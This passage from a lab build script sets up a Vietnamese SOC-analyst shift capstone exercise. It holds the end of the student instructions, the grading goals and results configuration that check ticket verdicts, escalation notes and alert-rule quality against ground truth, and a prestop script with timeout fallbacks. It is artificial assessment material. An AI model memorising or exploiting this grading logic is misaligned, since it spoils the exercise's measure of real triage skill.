  - Su co co P1: ghi chu leo thang ~/leo-thang/SC<n>.txt, CAP NHAT khi chuoi co buoc moi
    (SOP muc 10).
  - Yeu cau tu IR xuat hien trong ~/yeu-cau/<ten>/ (terminal se nhac): doc yeu-cau.txt,
    sua ~/luat/local_rules.xml (+ ~/luat/lists/), kiem bang thu-dong, nap bang kiem-thu-luat.
  - Nhac gio hien o lenh ke tiep trong terminal; go trang-thai bat cu luc nao.

SAU CA (phieu triage / su co / leo thang DA DONG BANG - sua them khong duoc tinh):
  - ~/ban-giao.txt  (SOP muc 12)   - ~/phan-tu.txt (tu nhin lai ca truc)
  - dien SAU= trong ~/khao-sat.txt - roi checkwork.

7. CHAM DIEM (TOM TAT)
--------------------------------------------------------------------------------
  Ba cong BAT BUOC (truot 1 cong = khong dat, du diem cao):
    - Khong bo sot ticket P1 nao (phai ghi dung verdict + uu tien truoc khi het ca).
    - Luat bao canh bao KHONG bi mu (van bat duoc tan cong that cung loai).
    - Yeu cau luat khan cua IR duoc trien khai truoc khi het ca.
  Diem tong 100: chinh xac (40) + thoi gian (30) + chat luong luat tren tap kiem tra AN (30).
  Dat bai = 3 cong + diem >= 60.
  checkwork TRUOC khi het ca: moi muc deu N (chua co gi de cham) - do la binh thuong.

8. LUU Y QUAN TRONG
--------------------------------------------------------------------------------
  * KHONG dung lab (stoplab) giua ca. Ca van tinh gio khi lab tat; luong log/bao trong luc
    tat bi mat, ticket se phat bu khi mo lai nhung ban mat thoi gian.
  * Neu terminal bao "Mat lien lac voi siem": doi 2-3 phut, ca van tinh gio.
  * Neu trang-thai bao "siem LOI: dia day": bao giang vien ngay.
  * Chi ghi file trong thu muc nha; dung dinh dang KEY=gia_tri dung nhu khung san
    (gia tri la SO khi SOP yeu cau so).
  * Tap kiem tra AN cua luat khac tap phat trien: dung "hoc thuoc" tap phat trien.
================================================================================
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# goals.config - Bai 18 - SINH TU DONG boi tools/gen-grading18.py (KHONG sua tay).
# Cong (kich ban 9.1) + thanh phan. Diem tong 100: tools/score-bai18.py (bang 9.2).
# Giua ca siem khong in dap an -> moi goal N.

lab_ready = boolean : ( _siem_marker and _def_marker )

# --- hang doi: v/p/e tung ticket; isp1 = ticket do la P1 cua chuoi ---
v_1 = matchany : integer_equal : _ans_v_1 : result._gt_v_1
p_1 = matchany : integer_equal : _ans_p_1 : result._gt_p_1
e_1 = matchany : integer_equal : _ans_e_1 : result._gt_e_1
isp1_1 = matchany : integer_equal : _gt_isp1_1 : answer=1
p1ok_1 = boolean : ( v_1 and p_1 ) or_not isp1_1
v_2 = matchany : integer_equal : _ans_v_2 : result._gt_v_2
p_2 = matchany : integer_equal : _ans_p_2 : result._gt_p_2
e_2 = matchany : integer_equal : _ans_e_2 : result._gt_e_2
isp1_2 = matchany : integer_equal : _gt_isp1_2 : answer=1
p1ok_2 = boolean : ( v_2 and p_2 ) or_not isp1_2
v_3 = matchany : integer_equal : _ans_v_3 : result._gt_v_3
p_3 = matchany : integer_equal : _ans_p_3 : result._gt_p_3
e_3 = matchany : integer_equal : _ans_e_3 : result._gt_e_3
isp1_3 = matchany : integer_equal : _gt_isp1_3 : answer=1
p1ok_3 = boolean : ( v_3 and p_3 ) or_not isp1_3
v_4 = matchany : integer_equal : _ans_v_4 : result._gt_v_4
p_4 = matchany : integer_equal : _ans_p_4 : result._gt_p_4
e_4 = matchany : integer_equal : _ans_e_4 : result._gt_e_4
isp1_4 = matchany : integer_equal : _gt_isp1_4 : answer=1
p1ok_4 = boolean : ( v_4 and p_4 ) or_not isp1_4
v_5 = matchany : integer_equal : _ans_v_5 : result._gt_v_5
p_5 = matchany : integer_equal : _ans_p_5 : result._gt_p_5
e_5 = matchany : integer_equal : _ans_e_5 : result._gt_e_5
isp1_5 = matchany : integer_equal : _gt_isp1_5 : answer=1
p1ok_5 = boolean : ( v_5 and p_5 ) or_not isp1_5
v_6 = matchany : integer_equal : _ans_v_6 : result._gt_v_6
p_6 = matchany : integer_equal : _ans_p_6 : result._gt_p_6
e_6 = matchany : integer_equal : _ans_e_6 : result._gt_e_6
isp1_6 = matchany : integer_equal : _gt_isp1_6 : answer=1
p1ok_6 = boolean : ( v_6 and p_6 ) or_not isp1_6
v_7 = matchany : integer_equal : _ans_v_7 : result._gt_v_7
p_7 = matchany : integer_equal : _ans_p_7 : result._gt_p_7
e_7 = matchany : integer_equal : _ans_e_7 : result._gt_e_7
isp1_7 = matchany : integer_equal : _gt_isp1_7 : answer=1
p1ok_7 = boolean : ( v_7 and p_7 ) or_not isp1_7
v_8 = matchany : integer_equal : _ans_v_8 : result._gt_v_8
p_8 = matchany : integer_equal : _ans_p_8 : result._gt_p_8
e_8 = matchany : integer_equal : _ans_e_8 : result._gt_e_8
isp1_8 = matchany : integer_equal : _gt_isp1_8 : answer=1
p1ok_8 = boolean : ( v_8 and p_8 ) or_not isp1_8
v_9 = matchany : integer_equal : _ans_v_9 : result._gt_v_9
p_9 = matchany : integer_equal : _ans_p_9 : result._gt_p_9
e_9 = matchany : integer_equal : _ans_e_9 : result._gt_e_9
isp1_9 = matchany : integer_equal : _gt_isp1_9 : answer=1
p1ok_9 = boolean : ( v_9 and p_9 ) or_not isp1_9
v_10 = matchany : integer_equal : _ans_v_10 : result._gt_v_10
p_10 = matchany : integer_equal : _ans_p_10 : result._gt_p_10
e_10 = matchany : integer_equal : _ans_e_10 : result._gt_e_10
isp1_10 = matchany : integer_equal : _gt_isp1_10 : answer=1
p1ok_10 = boolean : ( v_10 and p_10 ) or_not isp1_10
v_11 = matchany : integer_equal : _ans_v_11 : result._gt_v_11
p_11 = matchany : integer_equal : _ans_p_11 : result._gt_p_11
e_11 = matchany : integer_equal : _ans_e_11 : result._gt_e_11
isp1_11 = matchany : integer_equal : _gt_isp1_11 : answer=1
p1ok_11 = boolean : ( v_11 and p_11 ) or_not isp1_11
v_12 = matchany : integer_equal : _ans_v_12 : result._gt_v_12
p_12 = matchany : integer_equal : _ans_p_12 : result._gt_p_12
e_12 = matchany : integer_equal : _ans_e_12 : result._gt_e_12
isp1_12 = matchany : integer_equal : _gt_isp1_12 : answer=1
p1ok_12 = boolean : ( v_12 and p_12 ) or_not isp1_12
v_13 = matchany : integer_equal : _ans_v_13 : result._gt_v_13
p_13 = matchany : integer_equal : _ans_p_13 : result._gt_p_13
e_13 = matchany : integer_equal : _ans_e_13 : result._gt_e_13
isp1_13 = matchany : integer_equal : _gt_isp1_13 : answer=1
p1ok_13 = boolean : ( v_13 and p_13 ) or_not isp1_13

# --- 3 cong bat buoc ---
gate_no_missed_p1 = boolean : ( _frozen and _siem_end and p1ok_1 and p1ok_2 and p1ok_3 and p1ok_4 and p1ok_5 and p1ok_6 and p1ok_7 and p1ok_8 and p1ok_9 and p1ok_10 and p1ok_11 and p1ok_12 and p1ok_13 )
gate_storm_not_blind = boolean : ( _siem_end and _rb_not_blind )
gate_ra_deployed = boolean : ( _siem_end and _ra_deployed )
bai18_gates = boolean : ( gate_no_missed_p1 and gate_storm_not_blind and gate_ra_deployed )

# --- gom su co SC1 ---
sc1_tickets = matchany : integer_equal : _ans_sc_tk : result._gt_sc_tk
sc1_host_ten = matchany : integer_equal : _ans_sc_host : result._gt_sc_host
sc1_host_ip = matchany : integer_equal : _ans_sc_host : result._gt_sc_hostip
sc1_host = boolean : ( sc1_host_ten or sc1_host_ip )
sc1_giai_doan = matchany : integer_equal : _ans_sc_gd : result._gt_sc_gd

# --- ghi chu leo thang SC1: TICKET = bat ky ticket nao cua chuoi ---
lt_ticket_1 = matchany : integer_equal : _lt_ticket : result._gt_sc_t1
lt_ticket_2 = matchany : integer_equal : _lt_ticket : result._gt_sc_t2
lt_ticket_3 = matchany : integer_equal : _lt_ticket : result._gt_sc_t3
lt_ticket_4 = matchany : integer_equal : _lt_ticket : result._gt_sc_t4
lt_ticket = boolean : ( lt_ticket_1 or lt_ticket_2 or lt_ticket_3 or lt_ticket_4 )
lt_host_ten = matchany : integer_equal : _lt_host : result._gt_sc_host
lt_host_ip = matchany : integer_equal : _lt_host : result._gt_sc_hostip
lt_host = boolean : ( lt_host_ten or lt_host_ip )
lt_asset = matchany : integer_equal : _lt_asset : result._gt_sc_asset
lt_stage = matchany : integer_equal : _lt_stage : result._gt_sc_stage
lt_mitre = matchany : integer_equal : _lt_mitre : result._gt_sc_mitre
lt_ioc_c2 = matchany : integer_equal : _lt_ioc : result._gt_sc_ioc
lt_de_xuat = matchany : integer_equal : _lt_dx : result._gt_sc_dx

# --- chat luong luat (tap an, P va R >= 0.9) + luong that ---
ra_quality = boolean : ( _siem_end and _rules_valid and _ra_p90 and _ra_r90 )
rb_quality = boolean : ( _siem_end and _rules_valid and _rb_p90 and _rb_r90 )
c3_seen = boolean : ( _siem_end and _c3 )
c5_seen = boolean : ( _siem_end and _c5 )
storm_contained = boolean : ( _siem_end and _rb_contain20 and _rb_not_blind )

# --- sau ca ---
ban_giao = boolean : ( _frozen and _bg_full )
khao_sat = boolean : ( _ks_truoc and _ks_sau )
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# results.config - Bai 18 - SINH TU DONG boi tools/gen-grading18.py (KHONG sua tay).
# defender: phieu da DONG BANG (bai18-thu-thap) ; siem: dap an + tap an + luong that (grade18 print, chi sau het ca).

_def_marker      = defender:prestop.stdout : FILE_REGEX : DEFENDER18_MARKER
_siem_marker     = siem:prestop.stdout : FILE_REGEX : SIEM18_MARKER
_frozen          = defender:prestop.stdout : FILE_REGEX : \bSHIFT_FROZEN\b
_siem_end        = siem:prestop.stdout : FILE_REGEX : SHIFT_END=Y

# --- hang doi: tung ticket theo thu tu phat ---
_ans_inc_1       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_1=([0-9]+)
_ans_v_1         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_1=([0-9]+)
_ans_p_1         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_1=([0-9]+)
_ans_e_1         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_1=([0-9]+)
_gt_inc_1        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_1=([0-9]+)
_gt_v_1          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_1=([0-9]+)
_gt_p_1          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_1=([0-9]+)
_gt_e_1          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_1=([0-9]+)
_gt_isp1_1       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_1=([0-9]+)
_ans_inc_2       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_2=([0-9]+)
_ans_v_2         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_2=([0-9]+)
_ans_p_2         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_2=([0-9]+)
_ans_e_2         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_2=([0-9]+)
_gt_inc_2        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_2=([0-9]+)
_gt_v_2          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_2=([0-9]+)
_gt_p_2          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_2=([0-9]+)
_gt_e_2          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_2=([0-9]+)
_gt_isp1_2       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_2=([0-9]+)
_ans_inc_3       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_3=([0-9]+)
_ans_v_3         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_3=([0-9]+)
_ans_p_3         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_3=([0-9]+)
_ans_e_3         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_3=([0-9]+)
_gt_inc_3        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_3=([0-9]+)
_gt_v_3          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_3=([0-9]+)
_gt_p_3          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_3=([0-9]+)
_gt_e_3          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_3=([0-9]+)
_gt_isp1_3       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_3=([0-9]+)
_ans_inc_4       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_4=([0-9]+)
_ans_v_4         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_4=([0-9]+)
_ans_p_4         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_4=([0-9]+)
_ans_e_4         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_4=([0-9]+)
_gt_inc_4        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_4=([0-9]+)
_gt_v_4          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_4=([0-9]+)
_gt_p_4          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_4=([0-9]+)
_gt_e_4          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_4=([0-9]+)
_gt_isp1_4       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_4=([0-9]+)
_ans_inc_5       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_5=([0-9]+)
_ans_v_5         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_5=([0-9]+)
_ans_p_5         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_5=([0-9]+)
_ans_e_5         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_5=([0-9]+)
_gt_inc_5        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_5=([0-9]+)
_gt_v_5          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_5=([0-9]+)
_gt_p_5          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_5=([0-9]+)
_gt_e_5          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_5=([0-9]+)
_gt_isp1_5       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_5=([0-9]+)
_ans_inc_6       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_6=([0-9]+)
_ans_v_6         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_6=([0-9]+)
_ans_p_6         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_6=([0-9]+)
_ans_e_6         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_6=([0-9]+)
_gt_inc_6        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_6=([0-9]+)
_gt_v_6          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_6=([0-9]+)
_gt_p_6          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_6=([0-9]+)
_gt_e_6          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_6=([0-9]+)
_gt_isp1_6       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_6=([0-9]+)
_ans_inc_7       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_7=([0-9]+)
_ans_v_7         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_7=([0-9]+)
_ans_p_7         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_7=([0-9]+)
_ans_e_7         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_7=([0-9]+)
_gt_inc_7        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_7=([0-9]+)
_gt_v_7          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_7=([0-9]+)
_gt_p_7          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_7=([0-9]+)
_gt_e_7          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_7=([0-9]+)
_gt_isp1_7       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_7=([0-9]+)
_ans_inc_8       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_8=([0-9]+)
_ans_v_8         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_8=([0-9]+)
_ans_p_8         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_8=([0-9]+)
_ans_e_8         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_8=([0-9]+)
_gt_inc_8        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_8=([0-9]+)
_gt_v_8          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_8=([0-9]+)
_gt_p_8          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_8=([0-9]+)
_gt_e_8          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_8=([0-9]+)
_gt_isp1_8       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_8=([0-9]+)
_ans_inc_9       = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_9=([0-9]+)
_ans_v_9         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_9=([0-9]+)
_ans_p_9         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_9=([0-9]+)
_ans_e_9         = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_9=([0-9]+)
_gt_inc_9        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_9=([0-9]+)
_gt_v_9          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_9=([0-9]+)
_gt_p_9          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_9=([0-9]+)
_gt_e_9          = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_9=([0-9]+)
_gt_isp1_9       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_9=([0-9]+)
_ans_inc_10      = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_10=([0-9]+)
_ans_v_10        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_10=([0-9]+)
_ans_p_10        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_10=([0-9]+)
_ans_e_10        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_10=([0-9]+)
_gt_inc_10       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_10=([0-9]+)
_gt_v_10         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_10=([0-9]+)
_gt_p_10         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_10=([0-9]+)
_gt_e_10         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_10=([0-9]+)
_gt_isp1_10      = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_10=([0-9]+)
_ans_inc_11      = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_11=([0-9]+)
_ans_v_11        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_11=([0-9]+)
_ans_p_11        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_11=([0-9]+)
_ans_e_11        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_11=([0-9]+)
_gt_inc_11       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_11=([0-9]+)
_gt_v_11         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_11=([0-9]+)
_gt_p_11         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_11=([0-9]+)
_gt_e_11         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_11=([0-9]+)
_gt_isp1_11      = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_11=([0-9]+)
_ans_inc_12      = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_12=([0-9]+)
_ans_v_12        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_12=([0-9]+)
_ans_p_12        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_12=([0-9]+)
_ans_e_12        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_12=([0-9]+)
_gt_inc_12       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_12=([0-9]+)
_gt_v_12         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_12=([0-9]+)
_gt_p_12         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_12=([0-9]+)
_gt_e_12         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_12=([0-9]+)
_gt_isp1_12      = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_12=([0-9]+)
_ans_inc_13      = defender:prestop.stdout : GROUP : 1 : REGEX : \bINC_13=([0-9]+)
_ans_v_13        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_V_13=([0-9]+)
_ans_p_13        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_P_13=([0-9]+)
_ans_e_13        = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_E_13=([0-9]+)
_gt_inc_13       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_INC_13=([0-9]+)
_gt_v_13         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_V_13=([0-9]+)
_gt_p_13         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_P_13=([0-9]+)
_gt_e_13         = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_E_13=([0-9]+)
_gt_isp1_13      = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_ISP1_13=([0-9]+)

# --- gom su co SC1 (su-co.txt) ---
_ans_sc_tk       = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_SC_TK_C=([0-9]+)
_gt_sc_tk        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_TK_C=([0-9]+)
_ans_sc_host     = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_SC_HOST_C=([0-9]+)
_gt_sc_host      = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_HOST_C=([0-9]+)
_gt_sc_hostip    = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_HOSTIP_C=([0-9]+)
_ans_sc_gd       = defender:prestop.stdout : GROUP : 1 : REGEX : \bANS_SC_GIAI_DOAN=([0-9]+)
_gt_sc_gd        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_GIAI_DOAN=([0-9]+)

# --- ghi chu leo thang SC1 (leo-thang/SC1.txt), 7 truong dinh luong ---
_lt_ticket       = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_TICKET=([0-9]+)
_gt_sc_t1        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_T1=([0-9]+)
_gt_sc_t2        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_T2=([0-9]+)
_gt_sc_t3        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_T3=([0-9]+)
_gt_sc_t4        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_T4=([0-9]+)
_lt_host         = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_HOST_C=([0-9]+)
_lt_asset        = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_ASSET_LEVEL=([0-9]+)
_gt_sc_asset     = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_ASSET=([0-9]+)
_lt_stage        = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_STAGE=([0-9]+)
_gt_sc_stage     = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_STAGE=([0-9]+)
_lt_mitre        = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_MITRE_C=([0-9]+)
_gt_sc_mitre     = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_MITRE_C=([0-9]+)
_lt_ioc          = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_IOC_C2=([0-9]+)
_gt_sc_ioc       = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_IOC_C2=([0-9]+)
_lt_dx           = defender:prestop.stdout : GROUP : 1 : REGEX : \bLT_DE_XUAT_C=([0-9]+)
_gt_sc_dx        = siem:prestop.stdout : GROUP : 1 : REGEX : \bGT_SC_DE_XUAT_C=([0-9]+)

# --- luat (tap AN, luat dang nap cuoi ca) + luong that cua ca (siem) ---
_rules_valid     = siem:prestop.stdout : FILE_REGEX : RULES_VALID=Y
_rb_not_blind    = siem:prestop.stdout : FILE_REGEX : \bRB_NOT_BLIND\b
_ra_deployed     = siem:prestop.stdout : FILE_REGEX : \bGATE_RA_DEPLOYED\b
_ra_p90          = siem:prestop.stdout : FILE_REGEX : \bRA_P100=(9[0-9]|100)\b
_ra_r90          = siem:prestop.stdout : FILE_REGEX : \bRA_R100=(9[0-9]|100)\b
_rb_p90          = siem:prestop.stdout : FILE_REGEX : \bRB_P100=(9[0-9]|100)\b
_rb_r90          = siem:prestop.stdout : FILE_REGEX : \bRB_R100=(9[0-9]|100)\b
_c3              = siem:prestop.stdout : FILE_REGEX : \bC3_SEEN\b
_c5              = siem:prestop.stdout : FILE_REGEX : \bC5_SEEN\b
_rb_contain20    = siem:prestop.stdout : FILE_REGEX : \bRB_CONTAIN_MIN=([0-9]|1[0-9]|20)\b
_live_gap        = siem:prestop.stdout : FILE_REGEX : \bLIVE_GAP\b

# --- sau ca ---
_bg_full         = defender:prestop.stdout : FILE_REGEX : \bBAN_GIAO_FILLED=[4-9]\b
_ks_truoc        = defender:prestop.stdout : FILE_REGEX : \bKS_TRUOC=[1-5]
_ks_sau          = defender:prestop.stdout : FILE_REGEX : \bKS_SAU=[1-5]

# --- Goi y checkwork (KHONG lo dap an) ---
#CHECK_TRUE: Ca truc chua ket thuc - moi muc deu N cho toi khi het ca (phieu dong bang). Xem: trang-thai
cw_ca_xong       = defender:prestop.stdout : FILE_REGEX : \bSHIFT_FROZEN\b
#CHECK_TRUE: Yeu cau R-A cua IR chua duoc trien khai truoc khi het ca (can >= 1 luat canh bao trong dai R-A, nap bang kiem-thu-luat).
cw_ra            = siem:prestop.stdout : FILE_REGEX : \bGATE_RA_DEPLOYED\b
#CHECK_TRUE: Luat dai R-B dang nap bi MU tren tap kiem tra an (tat/ha luat hoac ngoai le qua rong). SOP muc 11.
cw_rb            = siem:prestop.stdout : FILE_REGEX : \bRB_NOT_BLIND\b
#CHECK_TRUE: ban-giao.txt chua dien du cac truong (SOP muc 12).
cw_bangiao       = defender:prestop.stdout : FILE_REGEX : \bBAN_GIAO_FILLED=[4-9]\b
#CHECK_TRUE: khao-sat.txt chua dien TRUOC= va SAU= (1-5).
cw_khaosat       = defender:prestop.stdout : FILE_REGEX : \bKS_SAU=[1-5]
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/bin/bash
# siem dung anh chung soc-wazuh: boot-hook Labtainers bi bo qua -> khoi tao bang systemd (seed-bai18).
exit 0
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/bin/bash
# prestop siem (Bai 18): dap an theo thu tu phat + ket qua cham luat (tap an) + so lieu luong that.
# Labtainers cat prestop o ~30s; neu siem in thieu result, grader LOI ca bai (gap tren VM 27/11:
# mau-nap ngay truoc checkwork -> cham lai chiem khoa -> "Timed out").
#   1) in truc tiep, toi da 20s
#   2) khong kip -> ban in sau het ca do grade-bai18 luu (FROM_CACHE)
#   3) chua co ban luu -> gia tri giu cho (PRESTOP_FALLBACK): moi goal N nhung grader KHONG loi
# Khong cham lai luat trong prestop nua: grade-bai18 tu cham khi file luat doi (1-2 phut).
trap "echo Timed out; exit" SIGTERM
ls -t /home/ubuntu/.local/result/prestop.stdout.* 2>/dev/null | tail -n +2 | xargs -r rm -f 2>/dev/null
OUT=$(timeout 20 sudo -n /usr/bin/python3 /home/ubuntu/bai18/grade18.py print 2>/dev/null)
if ! echo "$OUT" | grep -q "^PRINT_DONE" ; then
  OUT=$(timeout 5 sudo -n /usr/bin/python3 /home/ubuntu/bai18/grade18.py cached 2>/dev/null)
fi
if [ -z "$OUT" ]; then
  OUT="SIEM18_MARKER
PRESTOP_FALLBACK"
  X=999999
  for k in $(seq 1 13); do OUT="$OUT
GT_INC_$k=$X GT_V_$k=$X GT_P_$k=$X GT_E_$k=$X GT_ISP1_$k=$X"; done
  OUT="$OUT
GT_SC_TK_C=$X GT_SC_HOST_C=$X GT_SC_HOSTIP_C=$X GT_SC_GIAI_DOAN=$X
GT_SC_T1=$X GT_SC_T2=$X GT_SC_T3=$X GT_SC_T4=$X
GT_SC_ASSET=$X GT_SC_STAGE=$X GT_SC_MITRE_C=$X GT_SC_IOC_C2=$X GT_SC_DE_XUAT_C=$X"
fi
echo "$OUT"
if echo "$OUT" | grep -q RULES_STALE; then
  echo "# Luat vua doi, siem dang cham lai - checkwork lai sau 1-2 phut."
fi
exit 0
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18"
cat > "$LAB/siem/bai18/README.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
